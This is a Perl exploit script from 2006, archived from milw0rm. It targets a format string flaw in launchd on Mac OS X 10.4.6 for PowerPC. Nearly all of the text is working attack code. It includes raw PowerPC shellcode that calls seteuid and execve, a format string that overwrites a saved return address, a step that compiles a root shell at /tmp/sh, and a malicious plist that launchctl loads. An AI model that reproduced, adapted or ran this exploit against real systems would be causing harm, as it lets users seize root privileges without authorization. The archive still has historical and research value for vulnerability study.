<html><head><title>Mac OS X <= 10.4.6 (launchd) Local Format String Exploit (ppc)</title></head><pre>#!/usr/bin/perl
#
# http://www.digitalmunition.com/FailureToLaunch-ppc.pl
# Code by Kevin Finisterre kf_lists[at]digitalmunition[dot]com
#
# Much appreciation goes to John H for all kindsa random shit like exploiting Veritas and other random things in the past
#
# core... where the hell are you fool. 
#
# This is just a vanilla format string exploit for OSX on ppc. We overwrite a saved return addy with our shellcode address.
# This code currently overwrites a saved return addy with the stack location of our seteuid() / execve() shellcode.
#
# This exploit will create a malicious .plist file for you to use with launchctl
# kevin-finisterres-mac-mini:~ kfinisterre$ launchctl load ./com.pwnage.plist
#
# In theory I guess you could also drop this in ~/Library/LaunchAgents
# 
# This was tested against OSX 10.4.6 8l127 on a 1.25GHz PowerPC G4 and a
# 500mhz PowerPC G3 running 10.4 8A428
# 
# kevin-finisterres-mac-mini:~ kfinisterre$ ls -al /sbin/launchd
# -rwsr-sr-x   1 root  wheel  80328 Feb 19 04:09 /sbin/launchd
# kevin-finisterres-mac-mini:~ kfinisterre$ file /sbin/launchd
# /sbin/launchd: setuid setgid Mach-O executable ppc
#
# ./src/SystemStarter.c:374:              syslog(level, buf);
#
# http://developer.apple.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/AccessControl.html
# &quot;Because launchd is a critical system component, it receives a lot of peer review by in-house developers at Apple. 
#  It is less likely to contain security vulnerabilities than most production code.&quot;
# 

foreach $key (keys %ENV) {

    delete $ENV{$key};

}

#// ppc execve() code by b-r00t + nemo to add seteuid(0)
$sc = 
&quot;\x7c\x63\x1a\x79&quot; . 
&quot;\x40\x82\xff\xfd&quot; . 
&quot;\x39\x40\x01\xc3&quot; . 
&quot;\x38\x0a\xfe\xf4&quot; . 
&quot;\x44\xff\xff\x02&quot; . 
&quot;\x39\x40\x01\x23&quot; . 
&quot;\x38\x0a\xfe\xf4&quot; . 
&quot;\x44\xff\xff\x02&quot; .
&quot;\x60\x60\x60\x60&quot; . 
&quot;\x7c\xa5\x2a\x79\x40\x82\xff\xfd&quot; . 
&quot;\x7d\x68\x02\xa6\x3b\xeb\x01\x70&quot; .
&quot;\x39\x40\x01\x70\x39\x1f\xfe\xcf&quot; .
&quot;\x7c\xa8\x29\xae\x38\x7f\xfe\xc8&quot; .
&quot;\x90\x61\xff\xf8\x90\xa1\xff\xfc&quot; .
&quot;\x38\x81\xff\xf8\x38\x0a\xfe\xcb&quot; .
&quot;\x44\xff\xff\x02\x7c\xa3\x2b\x78&quot; .
&quot;\x38\x0a\xfe\x91\x44\xff\xff\x02&quot; .
&quot;\x2f\x74\x6d\x70\x2f\x73\x68\x58&quot;;

$writeaddr = 0xbffffcf8; # Saved Return addy from frame 3 
$ENV{&quot;TERM_PROGRAM&quot;} = &quot;-&quot; . pack('l', $writeaddr) . pack('l', $writeaddr+2) . &quot;iiii&quot; x 1 . $sc ;

$format =   
# make it more robust yourself... I'm lazy
# 0xbfff fe70
&quot;%&quot; . 0xbfff . &quot;d%112\$hn&quot; .
&quot;%&quot; . 0x3ed9 . &quot;d%113\$hn&quot; ;

open(SUSH,&quot;&gt;/tmp/aaa.c&quot;);
printf SUSH &quot;int main(){seteuid(0);setuid(0);setgid(0);system(\&quot;/bin/sh\&quot;);}\n&quot;;
system(&quot;PATH=$PATH:/usr/bin/ cc -o /tmp/sh /tmp/aaa.c&quot;);

open(PWNED,&quot;&gt;com.pwnage.plist&quot;);   

print PWNED &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC \&quot;-//Apple Computer//DTD PLIST 1.0//EN\&quot; \&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd\&quot;&gt;
&lt;plist version=\&quot;1.0\&quot;&gt;
&lt;dict&gt;
	&lt;key&gt;Label&lt;/key&gt;
	&lt;string&gt;&quot; . &quot;$format&quot; .
	&quot;&lt;/string&gt;
	&lt;key&gt;ProgramArguments&lt;/key&gt;
	&lt;array&gt;
		&lt;string&gt;http://www.digitalmunition.com&lt;/string&gt;
	&lt;/array&gt;
	&lt;key&gt;RunAtLoad&lt;/key&gt;
	&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;\n&quot;;
close(PWNED);
print &quot;open a new window and type - \&quot;launchctl load ./com.pwnage.plist\&quot;\n&quot;;
system(&quot;/sbin/launchd&quot;);

# milw0rm.com [2006-07-01]</pre></html>